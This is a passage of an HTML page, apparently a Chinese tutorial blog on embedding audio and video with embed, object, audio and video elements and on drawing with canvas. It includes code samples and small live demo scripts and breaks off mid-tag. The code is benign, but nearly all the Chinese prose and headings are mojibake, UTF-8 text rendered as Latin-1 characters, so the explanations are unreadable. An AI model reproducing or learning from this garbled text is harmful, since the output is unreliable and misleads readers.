applicationï¼‰æ˜¯å¯ç”±æµè§ˆå™¨å¯åŠ¨çš„ç¨‹åºï¼Œä¹Ÿç§°ä¸ºæ’ä»¶ã€‚</p><p>è¾…åŠ©ç¨‹åºå¯ç”¨äºæ’­æ”¾éŸ³é¢‘å’Œè§†é¢‘ï¼ˆä»¥åŠå…¶ä»–ï¼‰ã€‚è¾…åŠ©ç¨‹åºæ˜¯ä½¿ç”¨ <code>&lt;object&gt;</code> æ ‡ç­¾æ¥åŠ è½½çš„ã€‚</p><h3 id="éŸ³é¢‘"><a href="#éŸ³é¢‘" class="headerlink" title="éŸ³é¢‘"></a>éŸ³é¢‘</h3><p>æœ‰è¿™å‡ ç§æ–¹æ¡ˆï¼š</p><p>å¯ä»¥ä½¿ç”¨æ’ä»¶ã€ä½¿ç”¨<code>&lt;embed&gt;</code>å…ƒç´ ã€ä½¿ç”¨ <code>&lt;object&gt;</code> å…ƒç´ ã€ä½¿ç”¨ HTML5 <code>&lt;audio&gt;</code> å…ƒç´ ç­‰ã€‚</p><h4 id="ä½¿ç”¨-lt-embed-gt-å…ƒç´ "><a href="#ä½¿ç”¨-lt-embed-gt-å…ƒç´ " class="headerlink" title="ä½¿ç”¨<embed>å…ƒç´ "></a>ä½¿ç”¨<code>&lt;embed&gt;</code>å…ƒç´ </h4><pre class="language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>embed</span> <span class="token attr-name">height</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>100<span class="token punctuation">"</span></span> <span class="token attr-name">width</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>100<span class="token punctuation">"</span></span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>song.mp3<span class="token punctuation">"</span></span> <span class="token punctuation">/&gt;</span></span></code></pre><h4 id="ä½¿ç”¨-lt-object-gt-å…ƒç´ "><a href="#ä½¿ç”¨-lt-object-gt-å…ƒç´ " class="headerlink" title="ä½¿ç”¨ <object> å…ƒç´ "></a>ä½¿ç”¨ <code>&lt;object&gt;</code> å…ƒç´ </h4><pre class="language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>object</span> <span class="token attr-name">height</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>100<span class="token punctuation">"</span></span> <span class="token attr-name">width</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>100<span class="token punctuation">"</span></span> <span class="token attr-name">data</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>song.mp3<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>object</span><span class="token punctuation">&gt;</span></span></code></pre><h4 id="ä½¿ç”¨-HTML5-lt-audio-gt-å…ƒç´ "><a href="#ä½¿ç”¨-HTML5-lt-audio-gt-å…ƒç´ " class="headerlink" title="ä½¿ç”¨ HTML5 <audio> å…ƒç´ "></a>ä½¿ç”¨ HTML5 <code>&lt;audio&gt;</code> å…ƒç´ </h4><pre class="language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>audio</span> <span class="token attr-name">controls</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>controls<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>source</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>song.mp3<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>audio/mp3<span class="token punctuation">"</span></span> <span class="token punctuation">/&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>source</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>song.ogg<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>audio/ogg<span class="token punctuation">"</span></span> <span class="token punctuation">/&gt;</span></span>Your browser does not support this audio format.<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>audio</span><span class="token punctuation">&gt;</span></span></code></pre><p>è¿™é‡Œå®šä¹‰äº†ä¸€ä¸ªå¤‡é€‰æ–‡ä»¶æºï¼Œå½“<code>.mp3</code> å¤±æ•ˆæˆ–æµè§ˆå™¨ä¸æ”¯æŒæ—¶ï¼Œå¯ä»¥è°ƒç”¨ <code>.ogg</code> çš„æ–‡ä»¶ã€‚æµè§ˆå™¨å°†ä½¿ç”¨ç¬¬ä¸€ä¸ªå¯è¯†åˆ«çš„æ ¼å¼ã€‚</p><p>è‹¥æµè§ˆå™¨ä¸æ”¯æŒ<code>audio</code>å…ƒç´ çš„è¯ï¼Œåˆ™ä¼šæ˜¾ç¤º <code>Your browser does not support this audio format.</code></p><p><code>audio</code>å…ƒç´ æœ‰å¦‚ä¸‹çš„å±æ€§ï¼š</p><table><thead><tr><th>å±æ€§</th><th>å€¼</th><th>æè¿°</th></tr></thead><tbody><tr><td>autoplay</td><td>autoplay</td><td>å¦‚æœå‡ºç°è¯¥å±æ€§ï¼Œåˆ™éŸ³é¢‘åœ¨å°±ç»ªåé©¬ä¸Šæ’­æ”¾ã€‚</td></tr><tr><td>controls</td><td>controls</td><td>å¦‚æœå‡ºç°è¯¥å±æ€§ï¼Œåˆ™å‘ç”¨æˆ·æ˜¾ç¤ºæ§ä»¶ï¼Œæ¯”å¦‚æ’­æ”¾æŒ‰é’®ã€‚</td></tr><tr><td>loop</td><td>loop</td><td>å¦‚æœå‡ºç°è¯¥å±æ€§ï¼Œåˆ™æ¯å½“éŸ³é¢‘ç»“æŸæ—¶é‡æ–°å¼€å§‹æ’­æ”¾ã€‚</td></tr><tr><td>preload</td><td>preload</td><td>å¦‚æœå‡ºç°è¯¥å±æ€§ï¼Œåˆ™éŸ³é¢‘åœ¨é¡µé¢åŠ è½½æ—¶è¿›è¡ŒåŠ è½½ï¼Œå¹¶é¢„å¤‡æ’­æ”¾ã€‚å¦‚æœä½¿ç”¨ â€œautoplayâ€ï¼Œåˆ™å¿½ç•¥è¯¥å±æ€§ã€‚</td></tr><tr><td>src</td><td><em>url</em></td><td>è¦æ’­æ”¾çš„éŸ³é¢‘çš„ URLã€‚</td></tr></tbody></table><h4 id="æ›´å¥½çš„æ–¹æ¡ˆ"><a href="#æ›´å¥½çš„æ–¹æ¡ˆ" class="headerlink" title="æ›´å¥½çš„æ–¹æ¡ˆ"></a>æ›´å¥½çš„æ–¹æ¡ˆ</h4><p><code>&lt;audio&gt;</code> å…ƒç´ ä¼šå°è¯•ä»¥ mp3 æˆ– ogg æ¥æ’­æ”¾éŸ³é¢‘ã€‚å¦‚æœå¤±è´¥ï¼Œä»£ç å°†å›é€€å°è¯• <code>&lt;embed&gt;</code> å…ƒç´ ã€‚</p><pre class="language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>audio</span> <span class="token attr-name">controls</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>controls<span class="token punctuation">"</span></span> <span class="token attr-name">height</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>100<span class="token punctuation">"</span></span> <span class="token attr-name">width</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>100<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>source</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>song.mp3<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>audio/mp3<span class="token punctuation">"</span></span> <span class="token punctuation">/&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>source</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>song.ogg<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>audio/ogg<span class="token punctuation">"</span></span> <span class="token punctuation">/&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>embed</span> <span class="token attr-name">height</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>100<span class="token punctuation">"</span></span> <span class="token attr-name">width</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>100<span class="token punctuation">"</span></span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>song.mp3<span class="token punctuation">"</span></span> <span class="token punctuation">/&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>audio</span><span class="token punctuation">&gt;</span></span></code></pre><h4 id="ä½¿ç”¨è¶…é“¾æ¥"><a href="#ä½¿ç”¨è¶…é“¾æ¥" class="headerlink" title="ä½¿ç”¨è¶…é“¾æ¥"></a>ä½¿ç”¨è¶…é“¾æ¥</h4><p>å®åœ¨ä¸è¡Œï¼Œå°±ç›´æ¥ç”¨ <code>a</code> é“¾æ¥æ ‡ç­¾å§ã€‚</p><p>ç‚¹å‡»è¯¥é“¾æ¥ï¼Œæµè§ˆå™¨ä¼šå¯åŠ¨â€œè¾…åŠ©åº”ç”¨ç¨‹åºâ€æ¥æ’­æ”¾è¯¥æ–‡ä»¶ã€‚ä¹Ÿå¯èƒ½ä¼šå¼¹å‡ºæ–‡ä»¶ä¸‹è½½ç•Œé¢ã€‚</p><pre class="language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>song.mp3<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>Play the sound<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">&gt;</span></span></code></pre><hr><h3 id="è§†é¢‘"><a href="#è§†é¢‘" class="headerlink" title="è§†é¢‘"></a>è§†é¢‘</h3><p>å’ŒéŸ³é¢‘ç±»ä¼¼ï¼Œä¹Ÿå¯ä»¥ç”¨<code>&lt;embed&gt;</code>å…ƒç´ ã€<code>&lt;object&gt;</code> å…ƒç´ ã€HTML5 <code>&lt;video&gt;</code> å…ƒç´ ã€è¶…é“¾æ¥ç­‰ã€‚</p><p>åªæ˜¯æŠŠç›¸åº”çš„æºï¼ˆsrcã€dataã€hrefç­‰ï¼‰ä¿®æ”¹ä¸ºè§†é¢‘åœ°å€å³å¯ã€‚</p><h4 id="ä½¿ç”¨-lt-video-gt-æ ‡ç­¾"><a href="#ä½¿ç”¨-lt-video-gt-æ ‡ç­¾" class="headerlink" title="ä½¿ç”¨ <video> æ ‡ç­¾"></a>ä½¿ç”¨ <code>&lt;video&gt;</code> æ ‡ç­¾</h4><p>æ˜¾ç¤ºä¸€æ®µåµŒå…¥ç½‘é¡µçš„ oggã€mp4 æˆ– webm æ ¼å¼çš„è§†é¢‘ã€‚</p><p>å®ƒæœ‰ä»¥ä¸‹å±æ€§ï¼š</p><table><thead><tr><th>å±æ€§</th><th>å€¼</th><th>æè¿°</th></tr></thead><tbody><tr><td>autoplay</td><td>autoplay</td><td>å¦‚æœå‡ºç°è¯¥å±æ€§ï¼Œåˆ™è§†é¢‘åœ¨å°±ç»ªåé©¬ä¸Šæ’­æ”¾ã€‚</td></tr><tr><td>controls</td><td>controls</td><td>å¦‚æœå‡ºç°è¯¥å±æ€§ï¼Œåˆ™å‘ç”¨æˆ·æ˜¾ç¤ºæ§ä»¶ï¼Œæ¯”å¦‚æ’­æ”¾æŒ‰é’®ã€‚</td></tr><tr><td>height</td><td><em>pixels</em></td><td>è®¾ç½®è§†é¢‘æ’­æ”¾å™¨çš„é«˜åº¦ã€‚</td></tr><tr><td>loop</td><td>loop</td><td>å¦‚æœå‡ºç°è¯¥å±æ€§ï¼Œåˆ™å½“åª’ä»‹æ–‡ä»¶å®Œæˆæ’­æ”¾åå†æ¬¡å¼€å§‹æ’­æ”¾ã€‚</td></tr><tr><td>preload</td><td>preload</td><td>å¦‚æœå‡ºç°è¯¥å±æ€§ï¼Œåˆ™è§†é¢‘åœ¨é¡µé¢åŠ è½½æ—¶è¿›è¡ŒåŠ è½½ï¼Œå¹¶é¢„å¤‡æ’­æ”¾ã€‚å¦‚æœä½¿ç”¨ â€œautoplayâ€ï¼Œåˆ™å¿½ç•¥è¯¥å±æ€§ã€‚</td></tr><tr><td>src</td><td><em>url</em></td><td>è¦æ’­æ”¾çš„è§†é¢‘çš„ URLã€‚</td></tr><tr><td>width</td><td><em>pixels</em></td><td>è®¾ç½®è§†é¢‘æ’­æ”¾å™¨çš„å®½åº¦ã€‚</td></tr></tbody></table><pre class="language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>video</span> <span class="token attr-name">width</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>320<span class="token punctuation">"</span></span> <span class="token attr-name">height</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>240<span class="token punctuation">"</span></span> <span class="token attr-name">controls</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>controls<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>source</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>movie.mp4<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>video/mp4<span class="token punctuation">"</span></span> <span class="token punctuation">/&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>source</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>movie.ogg<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>video/ogg<span class="token punctuation">"</span></span> <span class="token punctuation">/&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>source</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>movie.webm<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>video/webm<span class="token punctuation">"</span></span> <span class="token punctuation">/&gt;</span></span>Your browser does not support the video tag.<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>video</span><span class="token punctuation">&gt;</span></span></code></pre><p>å¯ä»¥ä½¿ç”¨ DOM è¿›è¡Œæ§åˆ¶è§†é¢‘çš„æ’­æ”¾ã€æš‚åœä»¥åŠåŠ è½½ç­‰ã€‚</p><pre class="language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text/javascript<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript">    <span class="token keyword">var</span> myVideo<span class="token operator">=</span>document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"video1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">playPause</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>         <span class="token keyword">if</span> <span class="token punctuation">(</span>myVideo<span class="token punctuation">.</span>paused<span class="token punctuation">)</span>             myVideo<span class="token punctuation">.</span><span class="token function">play</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token keyword">else</span>             myVideo<span class="token punctuation">.</span><span class="token function">pause</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span>     <span class="token keyword">function</span> <span class="token function">makeBig</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>         myVideo<span class="token punctuation">.</span>width<span class="token operator">=</span><span class="token number">560</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span>     <span class="token keyword">function</span> <span class="token function">makeSmall</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>         myVideo<span class="token punctuation">.</span>width<span class="token operator">=</span><span class="token number">320</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span>     <span class="token keyword">function</span> <span class="token function">makeNormal</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>         myVideo<span class="token punctuation">.</span>width<span class="token operator">=</span><span class="token number">420</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span> </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span> </code></pre><h4 id="æ›´å¥½çš„æ–¹æ¡ˆ-1"><a href="#æ›´å¥½çš„æ–¹æ¡ˆ-1" class="headerlink" title="æ›´å¥½çš„æ–¹æ¡ˆ"></a>æ›´å¥½çš„æ–¹æ¡ˆ</h4><pre class="language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>video</span> <span class="token attr-name">width</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>320<span class="token punctuation">"</span></span> <span class="token attr-name">height</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>240<span class="token punctuation">"</span></span> <span class="token attr-name">controls</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>controls<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>source</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>movie.mp4<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>video/mp4<span class="token punctuation">"</span></span> <span class="token punctuation">/&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>source</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>movie.ogg<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>video/ogg<span class="token punctuation">"</span></span> <span class="token punctuation">/&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>source</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>movie.webm<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>video/webm<span class="token punctuation">"</span></span> <span class="token punctuation">/&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>object</span> <span class="token attr-name">data</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>movie.mp4<span class="token punctuation">"</span></span> <span class="token attr-name">width</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>320<span class="token punctuation">"</span></span> <span class="token attr-name">height</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>240<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>embed</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>movie.swf<span class="token punctuation">"</span></span> <span class="token attr-name">width</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>320<span class="token punctuation">"</span></span> <span class="token attr-name">height</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>240<span class="token punctuation">"</span></span> <span class="token punctuation">/&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>object</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>video</span><span class="token punctuation">&gt;</span></span></code></pre><p>ä½¿ç”¨äº† 4 ç§ä¸åŒçš„è§†é¢‘æ ¼å¼ã€‚HTML 5 <code>&lt;video&gt;</code> å…ƒç´ ä¼šå°è¯•æ’­æ”¾ä»¥ mp4ã€ogg æˆ– webm æ ¼å¼ä¸­çš„ä¸€ç§æ¥æ’­æ”¾è§†é¢‘ã€‚å¦‚æœå‡å¤±è´¥ï¼Œåˆ™å›é€€åˆ° <code>&lt;embed&gt;</code> å…ƒç´ ã€‚</p><p>å½“ç„¶ï¼Œå¦‚æœè¿˜ä¸è¡Œï¼Œå¯ä»¥<strong>æŠŠè§†é¢‘ä¸Šä¼ åˆ°å„å¤§è§†é¢‘ç½‘ç«™</strong>ï¼Œç„¶å<strong>åµŒå…¥è§†é¢‘</strong>å°±å®Œäº‹äº†ã€‚</p><hr><h2 id="Canvas"><a href="#Canvas" class="headerlink" title="Canvas"></a>Canvas</h2><p>HTML5 çš„ canvas å…ƒç´ ä½¿ç”¨ JavaScript åœ¨ç½‘é¡µä¸Š<strong>ç»˜åˆ¶å›¾åƒ</strong>ã€‚</p><p>ç”»å¸ƒæ˜¯ä¸€ä¸ªçŸ©å½¢åŒºåŸŸï¼Œæ‚¨å¯ä»¥æ§åˆ¶å…¶æ¯ä¸€åƒç´ ã€‚</p><p>canvas æ‹¥æœ‰å¤šç§ç»˜åˆ¶è·¯å¾„ã€çŸ©å½¢ã€åœ†å½¢ã€å­—ç¬¦ä»¥åŠæ·»åŠ å›¾åƒçš„æ–¹æ³•ã€‚</p><h3 id="åˆ›å»º-canvas"><a href="#åˆ›å»º-canvas" class="headerlink" title="åˆ›å»º canvas"></a>åˆ›å»º canvas</h3><pre class="language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>canvas</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>myCanvasTest<span class="token punctuation">"</span></span> <span class="token attr-name">width</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>200<span class="token punctuation">"</span></span> <span class="token attr-name">height</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>100<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>canvas</span><span class="token punctuation">&gt;</span></span></code></pre><p>canvas å…ƒç´ æœ¬èº«æ˜¯æ²¡æœ‰ç»˜å›¾èƒ½åŠ›çš„ã€‚æ‰€æœ‰çš„ç»˜åˆ¶å·¥ä½œå¿…é¡»åœ¨ JavaScript å†…éƒ¨å®Œæˆã€‚</p><p>æ¯”å¦‚ç»˜åˆ¶ä¸€ä¸ªçº¢è‰²çš„çŸ©å½¢ã€‚</p><p>å…¶ä¸­ï¼Œ<code>getContext("2d")</code> å¯¹è±¡æ˜¯å†…å»ºçš„ HTML5 å¯¹è±¡ï¼Œæ‹¥æœ‰å¤šç§ç»˜åˆ¶è·¯å¾„ã€çŸ©å½¢ã€åœ†å½¢ã€å­—ç¬¦ä»¥åŠæ·»åŠ å›¾åƒçš„æ–¹æ³•ã€‚</p><pre class="language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text/javascript<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript"><span class="token keyword">var</span> c<span class="token operator">=</span>document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"myCanvasTest"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> cxt<span class="token operator">=</span>c<span class="token punctuation">.</span><span class="token function">getContext</span><span class="token punctuation">(</span><span class="token string">"2d"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>cxt<span class="token punctuation">.</span>fillStyle<span class="token operator">=</span><span class="token string">"#FF0000"</span><span class="token punctuation">;</span>cxt<span class="token punctuation">.</span><span class="token function">fillRect</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">150</span><span class="token punctuation">,</span><span class="token number">75</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span></code></pre><p><canvas id="myCanvasTest" width="200" height="100"></canvas></p><script type="text/javascript">var c=document.getElementById("myCanvasTest");var cxt=c.getContext("2d");cxt.fillStyle="#FF0000";cxt.fillRect(0,0,150,75);</script><br><h3 id="åæ ‡"><a href="#åæ ‡" class="headerlink" title="åæ ‡"></a>åæ ‡</h3><p>å·¦ä¸Šè§’ä¸º (0,0)ï¼Œå·¦åˆ°å³ä¸ºxè½´æ­£æ–¹å‘ï¼Œä¸Šåˆ°ä¸‹ä¸ºyè½´æ­£æ–¹å‘ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºã€‚</p><p><img src="/2020/02/18/FrontEnd_HTML_Advanced/canvas_coordinates.gif" alt="Canvasï¼šç†è§£åæ ‡"></p><p>è¿™é‡Œæœ‰ä¸ªç¤ºä¾‹â†“ã€‚</p><script type="text/javascript"> function cnvs_getCoordinates(e){x=e.clientX;y=e.clientY;document.getElementById("xycoordinates").innerHTML="Coordinates: (" + x + "," + y + ")";}function cnvs_clearCoordinates(){document.getElementById("xycoordinates").innerHTML="";}</script><p>æŠŠé¼ æ ‡æ‚¬åœåœ¨ä¸‹é¢çš„çŸ©å½¢ä¸Šå¯ä»¥çœ‹åˆ°åæ ‡ï¼š</p><div id="coordiv" style="float:left;width:199px;height:99px;border:1px solid #c3c3c3" onmousemove="cnvs_getCoordinates(event)" onmouseout="cnvs_clearCoordinates()"></div><br><div id="xycoordinates"></div><br><br><h3 id="ç»˜åˆ¶çº¿æ¡"><a href="#ç»˜åˆ¶çº¿æ¡" class="headerlink" title="ç»˜åˆ¶çº¿æ¡"></a>ç»˜åˆ¶çº¿æ¡</h3><pre class="language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>canvas</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>myCanvas1<span class="token punctuation">"</span></span> <span class="token attr-name">width</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>200<span class="token punctuation">"</span></span> <span class="token attr-name">height</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>100<span class="token punctuation">"</span></span> <span class="token style-attr"><span class="token attr-name">style</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token style language-css"><span class="token property">border</span><span class="token punctuation">:</span>1px solid #c3c3c3<span class="token punctuation">;</span></span><span class="token punctuation">"</span></span></span><span class="token punctuation">&gt;</span></span>    Your browser does not support the canvas element.<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>canvas</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text/javascript<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript">    <span class="token keyword">var</span> c<span class="token operator">=</span>document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"myCanvas1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">var</span> cxt<span class="token operator">=</span>c<span class="token punctuation">.</span><span class="token function">getContext</span><span class="token punctuation">(</span><span class="token string">"2d"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    cxt<span class="token punctuation">.</span><span class="token function">moveTo</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    cxt<span class="token punctuation">.</span><span class="token function">lineTo</span><span class="token punctuation">(</span><span class="token number">150</span><span class="token punctuation">,</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    cxt<span class="token punctuation">.</span><span class="token function">lineTo</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    cxt<span class="token punctuation">.</span><span class="token function">stroke</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></span><span class="token tag"><span class="token tag"><span class="token 